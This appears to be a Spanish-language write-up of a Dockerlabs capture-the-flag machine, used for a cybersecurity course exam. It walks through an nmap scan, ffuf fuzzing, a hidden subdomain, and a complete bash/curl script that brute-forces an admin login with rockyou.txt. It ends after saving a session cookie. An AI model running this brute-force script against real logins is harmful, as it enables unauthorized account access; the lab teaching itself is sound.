Maquina dificil de la plataforma Dockerlabs usada para evaluacion final de Diplomado 1 de Ciberseguridad BULWARK Y COMFAMA:

![image](https://github.com/user-attachments/assets/1afad8f1-e881-4eae-8ce2-450bd56d82d7)

## Instalacion
Despues de obtener el archivo **`.zip`** lo pasamos a nuestro entorno de trabajo, en mi caso voy a usar Kali linux.

## Comando para descomprimir el archivo
```bash
unzip secureLAB.zip
```

## Comando para iniciar la maquina
```bash
sudo bash auto_deploy.sh securelab.tar
```

## Info
![image](https://github.com/user-attachments/assets/fcf6915c-012f-4609-b348-060d058b5cc7)

Cuando terminemos de hackear, le damos a **`Ctrl + C`** y nos eliminara la maquina del sistema.

Hacemos un ping para verificar la conexion con la maquina objetivo.

![image](https://github.com/user-attachments/assets/a7c4c2ec-0308-479f-9334-1acdee3c0e00)

Con esto enviamos tramas ICMP “Internet Control Message Protocol” tipo (Echo Request) a la ip victima, esta misma, al estar en funcionamiento, revisa las cabeceras del paquete para verificar que es para ella, y responde con un (Echo Reply).)

1. Podemos ver el orden de estas tramas ICMP en el apartado “icmp_seq=”,
2. Con el valor de “ttl=” podemos ver el número máximo de saltos que puede dar un paquete antes de descartarse (Por lo general funciona para determinar el sistema operativo víctima)
3. Con el valor “time=” podemos ver el tiempo entre el “Echo Request” y el “Echo Reply”)

Con esto verificamos que la maquina responde perfectamente, ahora vamos empezar con el hackeo 👏👏👏

## Realizamos un escaneo de puertos
![image](https://github.com/user-attachments/assets/3a7de0a7-279e-4523-9eda-5db8e3ecbd2a)

🔍 Parámetros explicados:

**`-p-`**	    Escanea todos los puertos (1-65535), no solo los más comunes.

**`-sC`**	    Usa los scripts por defecto de Nmap (default scripts) para detección.

**`-sV`**	    Intenta detectar la versión del servicio que corre en cada puerto.

**`-n`**	    No resuelve DNS, es más rápido. No intenta convertir IPs en nombres.

**`172.17.0.2`**	Es la IP objetivo del escaneo (puede ser una máquina local o de red).

## Analisis

Vemos que hay un puerto 80 abierto, si ponemos la ip **`172.17.0.2`* en un navegador web, veremos una pagina normal aparentemente.

![image](https://github.com/user-attachments/assets/002e411f-627f-4a87-99bd-462f6163ebb3)

Abrimos la consola y a simple vista no encontramos nada interesante ni en el html ni en el script.js

![image](https://github.com/user-attachments/assets/35958cf3-7ede-4d12-9736-6e296276a53d)

Como no encontramos nada a simple vista, vamos a intentar encontrar posibles rutas ocultas

Usamos **`ffuf`** (Fast web Fuzzer) se usa para descubrir directorios y archivos ocultos en un servidor web, algo común en pruebas de penetración.
```bash
ffuf -u http://172.17.0.2/FUZZ -w /usr/share/wordlists/dirb/common.txt -H "User-Agent: Mozilla/5.0" -fs 275 -e .php,.html,.bak,.txt -c
```
Y bingo 🎉🎉🎉 encontramos algunas rutas ocultas dentro de esta web

![image](https://github.com/user-attachments/assets/8c4ec611-d885-4cd0-81f0-2e8cee193350)

Explicación por partes:

**`ffuf`**	Es una herramienta de fuzzing rápida para URL y archivos (como dirb o gobuster, pero más moderna y rápida).

**`-u`** http://172.17.0.2/FUZZ	Define la URL de ataque. FUZZ es el marcador que ffuf reemplazará con cada palabra del diccionario.

**`-w`** /usr/share/wordlists/dirb/common.txt	Ruta al diccionario con nombres comunes de directorios/archivos a probar.

**`-H`** "User-Agent: Mozilla/5.0"	Añade una cabecera HTTP personalizada, en este caso simula un navegador real.

**`-fs`** 275	Filtra respuestas que tengan un tamaño fijo de 275 bytes (posiblemente respuestas 404 personalizadas u otras inútiles).

**`-e`** .php,.html,.bak,.txt	Añade extensiones a probar, como admin.php, admin.bak, etc.

**`-c`**	Activa la salida con colores (para facilitar lectura en consola).

## ¿Qué está haciendo?

Está buscando rutas como estas:

http://172.17.0.2/admin

http://172.17.0.2/admin.php

http://172.17.0.2/config.bak

http://172.17.0.2/index.html

Para cada palabra en common.txt, ffuf prueba combinaciones con esas extensiones, y solo muestra respuestas diferentes a 275 bytes, lo que ayuda a filtrar basura y falsos positivos.

Al ingresar en la ruta http://172.17.0.2/matrix.php vemos que tiene deshabilitada la inspeccion por consola

![image](https://github.com/user-attachments/assets/3c13386b-4ec1-4736-acbd-907d3fa1213a)

Pero como sabemos que la ruta principal no tiene bloqueada la consola la abrimos desde http://172.17.0.2 e ingresamos a la ruta http://172.17.0.2/matrix.php y 👁️👁️👁️ nos encontramos con esto, un canvas que ejecuta el video estilo matrix inspeccionamos el script y vemos este codigo que contiene una varible que dice **`specialWord`** y tiene como valor **`secure-api-register`**

![screen](https://github.com/user-attachments/assets/f7d5a056-ba90-41cd-9ebb-7e9792ee6664)

Dado el valor de la variable y el empeño en proteger su visibilidad nos imaginamos que puede ser un dominio de este sitio web como estamos en un entorno de docker le agregamos la extension **`.dl`** para ver que podriamos ver en esa URL ejecutamos lo siguiente en la terminal

```bash
sudo nano /etc/hosts
```
Agregamos esto en el archivo que abrimos con nano
```bash
172.17.0.2               secure-api-register.dl
```
Y guardamos con **`Ctrl + O`** **`Enter`** y luego **`Ctrl + X`**

🧾 ¿Qué es /etc/hosts?

Es un archivo del sistema en Linux (y también en macOS y WSL) que asocia nombres de dominio con direcciones IP de forma local, antes de consultar un servidor DNS.

Es como una "mini agenda de DNS personalizada".

📌 ¿Para qué se usa?

Algunas aplicaciones comunes:

Redirigir dominios ================== Hacer que test.local apunte a 127.0.0.1.

Simular dominios en local	=========== Apuntar misitio.com a tu IP de pruebas.

Bloquear sitios	===================== Apuntar facebook.com a 127.0.0.1 para bloquearlo.

Entornos de desarrollo ============== Apuntar nombres ficticios a IPs de contenedores Docker o VMs.(secure-api-register.dl)

![image](https://github.com/user-attachments/assets/10ffc1ad-3b56-487c-8660-b2034add0bb4)

Ahora revisamos nuestra nueva URL (http://secure-api-register.dl) y encontramos un login

![image](https://github.com/user-attachments/assets/5168812c-9230-4e5f-8dde-26a4a1e2118b)

Intentemos hacer un login mediante fuerza bruta con el username 'admin' para esto nos creamos una funcion que haga esto

## 1. Creamos el script
```bash
nano bruteforce.sh
```

Agregamos este codigo

```bash
#!/bin/bash

# Verifica argumentos
if [ "$#" -ne 1 ]; then
    echo "Uso: $0 <wordlist.txt>"
    exit 1
fi

URL="http://secure-api-register.dl/login"
USERNAME="admin"
WORDLIST="$1"

# Verifica que el archivo exista
if [ ! -f "$WORDLIST" ]; then
    echo "[!] No se pudo abrir el archivo: $WORDLIST"
    exit 1
fi

# Itera sobre cada línea del archivo de contraseñas
while IFS= read -r PASSWORD; do
    PASSWORD=$(echo "$PASSWORD" | tr -d '\r')  # Elimina caracteres raros (como \r en wordlists de Windows)
    echo "[*] Analizando: $PASSWORD"

    RESPONSE=$(curl -s -X POST "$URL" \
        -H "Content-Type: application/json" \
        -d "{\"username\": \"$USERNAME\", \"password\": \"$PASSWORD\"}" \
        -c cookie.txt)

    if [[ "$RESPONSE" != *'"message":"Invalid credentials"'* ]]; then
        echo "[+] Credenciales válidas encontradas: $USERNAME:$PASSWORD"
        exit 0
    fi
done < "$WORDLIST"

echo "[-] No se encontraron credenciales válidas."

```

## 2. Le damos permisos de ejecución: 
```bash
chmod +x bruteforce.sh
```

## 3. Lo ejecutamos
Yo usare la lista de rockyou.txt pero puedes usar la que desees

```bash
./bruteforce.sh /usr/share/wordlists/rockyou.txt
```
![image](https://github.com/user-attachments/assets/fb7d6f56-47a8-4ccd-9282-f64bc7d7b66f)

🎉🎉🎉🎉🎉🎉 Encontramos la contraseña **`love`** para el username **`admin`** en la web ingresamos estos datos y vemos que nos lleva a un panel de administracion

![image](https://github.com/user-attachments/assets/0956785c-fcd1-4b01-b8bf-c6f0ea86dc39)

Seguimos con nuestra inspeccion mediante la consola y encontramos lo siguente en el storage de la aplicacion web

![image](https://github.com/user-attachments/assets/7894dcab-47d1-4457-b3bc-b1fb0fdf3c96)

Ahora tenemos un posible token para interacturar con la API de este sitio web, ahora que tenemos una cookie vamos a guardarla en un archivo para poder usarla en una peticion con Curl

```bash
curl -X POST http://secure-api-register.dl/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "love"}' \
  -c cookie.txt
```

🔍 ¿Qué hace este comando?

| Parte                                            | Explicación                                                                  |
| ------------------------------------------------ | ---------------------------------------------------------------------------- |
| `curl -X POST`                                   | Indica que se hará una petición HTTP `POST`.                                 |
| `http://secure-api-register.dl/login`            | URL del endpoint donde se envía el login.                                    |
| `-H "Content-Type: application/json"`            | Especifica que el cuerpo de la petición está en formato JSON.                |
| `-d '{"username": "admin", "password": "love"}'` | Cuerpo JSON con las credenciales que estás probando.                         |
| `-c cookie.txt`                                  | Guarda cualquier cookie que el servidor devuelva en el archivo `cookie.txt`. |



























